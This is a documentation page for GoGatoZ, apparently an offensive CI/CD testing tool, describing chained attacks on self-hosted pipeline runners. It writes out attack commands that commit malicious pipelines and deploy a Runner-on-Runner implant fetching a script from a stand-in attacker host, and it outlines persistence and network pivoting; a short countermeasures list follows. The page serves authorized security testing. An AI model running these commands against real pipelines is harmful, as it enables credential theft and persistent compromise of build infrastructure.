---
title: Complex Attack Scenarios
description: Advanced attack techniques and chained exploitation scenarios
---

This page describes advanced attack techniques and scenarios that GoGatoZ can help execute or defend against.

> **Warning**: These techniques should only be used with proper authorization and for ethical security research purposes.

## Chaining Multiple Vulnerabilities

Many real-world attacks involve chaining multiple vulnerabilities together to achieve the ultimate objective.

### Example: From MR Comment to Self-Hosted Runner

1. **Initial Access**: Exploit a variable injection vulnerability in a pipeline triggered by merge requests
2. **Privilege Escalation**: Use the injected code to access CI/CD variables or runner credentials
3. **Persistence**: Deploy a Runner-on-Runner implant on a self-hosted runner
4. **Lateral Movement**: Use the compromised runner to access other systems on the network

## Custom Runner-on-Runner (RoR) Deployment

GoGatoZ supports deploying RoR through various methods.

### Using Custom CI via Push

If you have write access to a repository that uses self-hosted runners:

```bash
gogatoz attack --commit-ci --target group/project \
  --ci-file custom_ror_pipeline.yml --tags shell \
  --branch gogatoz-attack --deconflict suffix
```

Where `custom_ror_pipeline.yml` contains a pipeline that deploys the RoR implant.

### Using Payload-Only Mode

For situations where you need to generate the payload without committing:

```bash
gogatoz attack --payload runner-on-runner \
  --script-url https://attacker/p.sh --os linux --keepalive 30 \
  --tags shell --payload-only > ror_payload.yml
```

## Advanced Self-Hosted Runner Attacks

### Targeting Specific Runner Tags

If you know that certain runners have specific capabilities or access:

```bash
gogatoz attack --discover-tags --target group/project
# Then target specific tags
gogatoz attack --commit-ci --target group/project \
  --payload ror --tags production,database --script-url https://attacker/p.sh
```

### Persistent Access

For runners that persist across jobs:

1. Deploy the RoR implant with the `--keepalive` flag
2. Use the implant to establish persistence through other means:
   - Create cron jobs
   - Modify startup scripts
   - Deploy additional backdoors

### Network Pivoting

Once you have access to a self-hosted runner, you can use it to pivot to other systems:

1. Use the runner shell to perform network reconnaissance
2. Deploy network tunneling tools
3. Access internal services not exposed to the internet

## Countermeasures

To defend against these advanced attacks:

1. Implement strict branch protection rules
2. Require approval for all pipelines from forks
3. Use ephemeral runners in isolated environments
4. Implement network segmentation for runners
5. Monitor pipeline runs for suspicious activity
6. Regularly audit CI/CD files and permissions
7. Use the principle of least privilege for all tokens and permissions
